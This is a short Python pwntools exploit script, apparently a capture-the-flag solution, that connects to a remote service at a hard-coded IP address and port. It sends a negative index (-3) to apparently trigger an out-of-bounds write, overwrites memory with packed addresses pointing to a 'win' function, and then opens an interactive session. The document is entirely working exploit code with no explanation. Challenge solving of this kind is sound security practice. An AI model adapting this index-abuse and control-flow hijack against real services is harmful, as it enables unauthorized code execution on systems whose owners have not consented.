from pwn import *
import time
exe = context.binary = ELF("./prob")
r = process()
r = remote("3.37.174.221",33333)
r.sendline("1")
r.sendline("-3")
# time.sleep(10)
r.sendline(p64(exe.sym['win']) + p64(0x0000000000401080) + p64(0x0000000000401080) + p64(0x0000000000401080))
r.sendline("1")
r.sendline("1")
r.interactive()